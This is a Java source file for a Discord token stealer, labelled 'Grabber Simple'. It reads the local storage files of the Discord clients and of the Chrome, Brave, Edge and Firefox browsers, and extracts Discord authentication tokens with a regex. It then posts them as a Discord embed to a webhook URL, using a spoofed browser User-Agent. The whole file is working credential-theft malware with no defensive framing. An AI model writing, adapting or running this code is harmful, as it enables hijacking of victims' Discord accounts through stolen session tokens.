import java.io.*;
import java.net.*;
import java.util.*;
import java.util.regex.*;

public class Main {
    private static final String webhookURL = "";
    private static final String TOKEN_REGEX_PATTERN = "[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{34,38}";

    public static void main(String[] args) {
        Map<String, List<String>> tokensPorNavegador = dumpear();
        String embedJson = crearEmbed(tokensPorNavegador);
        saveinoutput(embedJson);
    }

    private static Map<String, List<String>> dumpear() {
        Map<String, List<String>> tokensPorNavegador = new LinkedHashMap<>();
        tokensPorNavegador.put("Discord", new ArrayList<>());
        tokensPorNavegador.put("Discord PTB", new ArrayList<>());
        tokensPorNavegador.put("Discord Canary", new ArrayList<>());
        tokensPorNavegador.put("Chrome", new ArrayList<>());
        tokensPorNavegador.put("Brave", new ArrayList<>());
        tokensPorNavegador.put("Edge", new ArrayList<>());
        tokensPorNavegador.put("Firefox", new ArrayList<>());

        Map<String, String> rutas = new LinkedHashMap<>();
        rutas.put("Discord", System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb");
        rutas.put("Discord PTB", System.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb");
        rutas.put("Discord Canary", System.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb");
        rutas.put("Chrome", System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
        rutas.put("Brave", System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");
        rutas.put("Edge", System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb");
        rutas.put("Firefox", System.getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles");

        Pattern pattern = Pattern.compile(TOKEN_REGEX_PATTERN);

        for (Map.Entry<String, String> entry : rutas.entrySet()) {
            Set<String> tokensUnicos = new HashSet<>();
            File dir = new File(entry.getValue());
            if (!dir.exists()) {
                tokensPorNavegador.get(entry.getKey()).addAll(tokensUnicos);
                continue;
            }

            if (entry.getKey().equals("Firefox")) {
                File[] profiles = dir.listFiles();
                if (profiles != null) {
                    for (File profile : profiles) {
                        File leveldb = new File(profile, "storage\\default");
                        if (!leveldb.exists()) continue;
                        File[] files = leveldb.listFiles();
                        if (files == null) continue;
                        for (File file : files) {
                            if (!file.isFile()) continue;
                            extraerTokensDeArchivo(file, pattern, tokensUnicos);
                        }
                    }
                }
            } else {
                File[] files = dir.listFiles();
                if (files != null) {
                    for (File file : files) {
                        if (!file.isFile()) continue;
                        extraerTokensDeArchivo(file, pattern, tokensUnicos);
                    }
                }
            }
            tokensPorNavegador.get(entry.getKey()).addAll(tokensUnicos);
        }
        return tokensPorNavegador;
    }

    private static void extraerTokensDeArchivo(File file, Pattern pattern, Set<String> tokensUnicos) {
        try (BufferedReader br = new BufferedReader(new FileReader(file))) {
            String line;
            while ((line = br.readLine()) != null) {
                Matcher matcher = pattern.matcher(line);
                while (matcher.find()) {
                    tokensUnicos.add(matcher.group());
                }
            }
        } catch (IOException ignored) {}
    }

    private static String crearEmbed(Map<String, List<String>> tokensPorNavegador) {
        StringBuilder fields = new StringBuilder();
        for (Map.Entry<String, List<String>> entry : tokensPorNavegador.entrySet()) {
            String navegador = entry.getKey();
            List<String> tokens = entry.getValue();
            String value;
            if (tokens.isEmpty()) {
                value = "||No se encontraron tokens.||";
            } else {
                StringBuilder sb = new StringBuilder();
                for (String token : tokens) {
                    sb.append("||").append(token).append("||\n");
                }
                value = sb.toString().trim();
            }
            fields.append("{\"name\": \"").append(navegador)
                  .append("\", \"value\": ").append(JSONObjectQuote(value))
                  .append(", \"inline\": false},");
        }
        if (fields.length() > 0) fields.setLength(fields.length() - 1); // Quitar última coma

        String embed = "{"
            + "\"embeds\": [{"
            + "\"title\": \"Grabber Simple\","
            + "\"color\": 5814783,"
            + "\"fields\": ["
            + fields
            + "],"
            + "\"footer\": {\"text\": \"by Grabber Simple Lurkin\"}"
            + "}]"
            + "}";
        return embed;
    }

    
    private static String JSONObjectQuote(String text) {
        return "\"" + text.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n") + "\"";
    }

    private static void saveinoutput(String embedJson) {
        try {
            URL url = new URL(webhookURL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");

            try (OutputStream os = conn.getOutputStream()) {
                os.write(embedJson.getBytes("UTF-8"));
            }

            int responseCode = conn.getResponseCode();
            if (responseCode != 204) {
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getErrorStream()));
                String line;
                while ((line = br.readLine()) != null) {
                    System.out.println(line);
                }
            }
          } catch (IOException e) {
            e.printStackTrace();
        }
    }
} 